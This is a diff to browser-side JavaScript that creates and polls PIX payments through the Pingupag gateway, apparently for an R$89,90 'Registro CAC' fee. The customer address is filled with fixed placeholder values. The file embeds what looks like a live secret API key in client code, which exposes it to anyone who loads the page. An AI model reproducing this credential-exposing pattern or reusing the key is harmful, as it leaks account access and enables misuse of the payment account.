@@ -5,7 +5,8 @@
 
 console.log('✅ Script Pingupag PIX carregado');
 
-const PINGUPAG_API = {
+// Garante que o objeto está no escopo global
+window.PINGUPAG_API = {
     baseURL: 'https://app.pingupag.com/gateway/v1',
     apiKey: 'pingupag_sk_5a4a884661598e034154315cc12ce8e55ebfd026625c057dcf673b7ca7512384',
     amount: 8990, // R$ 89,90
@@ -50,10 +51,9 @@ const PINGUPAG_API = {
         
         const payload = {
             amount: this.amount,
-            description: 'Loja 05 - Pingupag',
+            description: 'Registro CAC',
             reference: reference,
             source: 'api_externa',
-            postback_url: window.location.origin + '/webhook/payment',
             customer: {
                 name: userData.nome,
                 email: userData.email,
@@ -66,35 +66,37 @@ const PINGUPAG_API = {
                 street: 'Avenida Paulista',
                 number: '1000',
                 zipcode: '01310100'
-            },
-            tracking: {
-                utm_source: 'registro-cac',
-                utm_campaign: 'taxa-registro'
             }
         };
         
         console.log('📤 Enviando para Pingupag:', payload);
         
-        const response = await fetch(`${this.baseURL}/transaction`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-API-Key': this.apiKey
-            },
-            body: JSON.stringify(payload)
-        });
-        
-        const data = await response.json();
-        console.log('📥 Resposta Pingupag:', data);
-        
-        if (data.status !== 'success') {
-            throw new Error(data.message || 'Erro ao gerar PIX');
+        try {
+            const response = await fetch(`${this.baseURL}/transaction`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-API-Key': this.apiKey
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            const data = await response.json();
+            console.log('📥 Resposta Pingupag:', data);
+            
+            if (data.status !== 'success') {
+                throw new Error(data.message || 'Erro ao gerar PIX');
+            }
+            
+            // Salva os dados para verificação posterior
+            localStorage.setItem('pixPaymentId', data.transaction_id);
+            localStorage.setItem('pixPaymentData', JSON.stringify(data));
+            
+            return data;
+        } catch (error) {
+            console.error('Erro ao criar PIX:', error);
+            throw error;
         }
-        
-        localStorage.setItem('pixPaymentId', data.transaction_id);
-        localStorage.setItem('pixPaymentData', JSON.stringify(data));
-        
-        return data;
     },
     
     async checkPaymentStatus(transactionId) {
@@ -106,7 +108,9 @@ const PINGUPAG_API = {
                 }
             });
             
-            return await response.json();
+            const data = await response.json();
+            console.log('Status da transação:', data);
+            return data;
         } catch (e) {
             console.warn('Erro ao verificar pagamento:', e);
             throw e;
@@ -114,19 +118,35 @@ const PINGUPAG_API = {
     }
 };
 
-function showPixPayment(paymentData) {
-    console.log('Exibindo PIX:', paymentData);
+// Função global para exibir o PIX
+window.showPixPayment = function(paymentData) {
+    console.log('📲 Exibindo PIX:', paymentData);
     
     const pixContainer = document.getElementById('pix-container');
     const pixLoading = document.getElementById('pix-loading');
     
     if (pixLoading) pixLoading.style.display = 'none';
     if (!pixContainer) {
-        console.error('Container pix-container não encontrado');
+        console.error('❌ Container pix-container não encontrado');
         return;
     }
     
-    const pixCode = paymentData.qr_code;
+    // Garante que tem o QR code
+    const pixCode = paymentData.qr_code || paymentData.qrcode || 'erro_ao_gerar';
+    if (!pixCode || pixCode === 'erro_ao_gerar') {
+        console.error('❌ QR Code não encontrado na resposta:', paymentData);
+        pixContainer.innerHTML = `
+            <div class="bg-red-50 border border-red-200 rounded-lg p-6 text-center">
+                <p class="text-red-700">❌ Erro: QR Code não foi gerado</p>
+                <details class="text-xs text-gray-600 mt-2">
+                    <summary>Resposta da API</summary>
+                    <pre>${JSON.stringify(paymentData, null, 2)}</pre>
+                </details>
+            </div>
+        `;
+        return;
+    }
+    
     const valor = (paymentData.amount / 100).toFixed(2);
     
     pixContainer.innerHTML = `
@@ -161,7 +181,7 @@ function showPixPayment(paymentData) {
                         class="flex-1 px-4 py-2 border border-gray-300 rounded font-mono text-sm"
                     >
                     <button 
-                        onclick="copiarPix()" 
+                        onclick="window.copiarPix()" 
                         class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded font-semibold"
                     >
                         <i class="fas fa-copy"></i> Copiar
@@ -181,35 +201,44 @@ function showPixPayment(paymentData) {
         </div>
     `;
     
-    // Gera QR Code
+    // Gera QR Code com tratamento de erro
     try {
-        new QRCode(document.getElementById('qrcode'), {
-            text: pixCode,
-            width: 256,
-            height: 256,
-            colorDark: '#000000',
-            colorLight: '#ffffff',
-            correctLevel: QRCode.CorrectLevel.H
-        });
+        if (typeof QRCode !== 'undefined') {
+            new QRCode(document.getElementById('qrcode'), {
+                text: pixCode,
+                width: 256,
+                height: 256,
+                colorDark: '#000000',
+                colorLight: '#ffffff',
+                correctLevel: QRCode.CorrectLevel.H
+            });
+            console.log('✅ QR Code gerado com sucesso');
+        } else {
+            console.error('❌ QRCode.js não carregado');
+        }
     } catch (e) {
         console.error('Erro ao gerar QR Code:', e);
     }
     
-    // Inicia verificação
-    startPaymentVerification(paymentData.transaction_id);
-}
+    // Inicia verificação de pagamento
+    window.startPaymentVerification(paymentData.transaction_id);
+};
 
-function copiarPix() {
+// Função para copiar PIX
+window.copiarPix = function() {
     const pixCode = document.getElementById('pix-code');
-    pixCode.select();
-    document.execCommand('copy');
-    alert('✓ PIX copiado com sucesso!');
-}
+    if (pixCode) {
+        pixCode.select();
+        document.execCommand('copy');
+        alert('✓ PIX copiado com sucesso!');
+    }
+};
 
 let verificationInterval = null;
 
-function startPaymentVerification(transactionId) {
-    console.log('Iniciando verificação de pagamento...');
+// Função para verificar pagamento
+window.startPaymentVerification = function(transactionId) {
+    console.log('🔄 Iniciando verificação de pagamento...');
     
     let attempts = 0;
     const maxAttempts = 360; // 30 minutos
@@ -219,25 +248,27 @@ function startPaymentVerification(transactionId) {
         
         if (attempts > maxAttempts) {
             clearInterval(verificationInterval);
+            console.log('⏱️ Timeout de verificação');
             return;
         }
         
         try {
-            const status = await PINGUPAG_API.checkPaymentStatus(transactionId);
+            const status = await window.PINGUPAG_API.checkPaymentStatus(transactionId);
             
-            if (status.status === 'approved') {
+            if (status.status === 'approved' || status.payment_status === 'paid') {
                 console.log('✅ Pagamento confirmado!');
                 clearInterval(verificationInterval);
-                onPaymentSuccess(status);
+                window.onPaymentSuccess(status);
             }
         } catch (e) {
-            // Silencia erros
+            // Silencia erros de verificação
         }
     }, 5000);
-}
+};
 
-function onPaymentSuccess(paymentData) {
-    console.log('✅ Pagamento confirmado com sucesso!');
+// Função chamada quando pagamento é confirmado
+window.onPaymentSuccess = function(paymentData) {
+    console.log('✅✅ Pagamento confirmado com sucesso!');
     
     localStorage.setItem('pixPaymentStatus', 'APPROVED');
     localStorage.setItem('pixPaymentConfirmedAt', new Date().toISOString());
@@ -255,4 +286,6 @@ function onPaymentSuccess(paymentData) {
             </div>
         `;
     }
-}
+};
+
+console.log('✅ Todas as funções Pingupag carregadas');
